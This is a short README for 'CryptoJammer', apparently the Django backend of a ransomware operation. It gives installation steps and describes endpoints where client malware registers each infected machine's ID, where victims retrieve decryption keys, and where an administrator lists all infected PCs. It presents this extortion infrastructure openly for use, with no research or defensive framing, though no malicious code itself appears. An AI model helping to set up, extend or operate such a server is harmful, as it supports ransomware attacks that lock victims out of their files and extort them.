# CryptoJammer
## Installation
1. download and install python and pip
2. RUN: pip install virtualenv
3. RUN: virtualenv venv
4. RUN: ./venv/Scripts/activate.ps1
5. RUN: pip install -r requirements.txt
6. RUN: python ./manage.py runserver

Now the server is available on localhost:8000
## Pages
#### /decrypt
Page for infected user to obtain decryption key
#### /encrypt 
Page for client software to do json http post in the following format
```javascript
{ "uniqueID": "<put unique id here>" }
```
#### /admin
A small admin interface. A account for this can be created by running ./manage.py createsuperuser
#### /list-infected-pc
This prints an overview of all infected PCs. This endpoint only works if you are logged in as superuser.
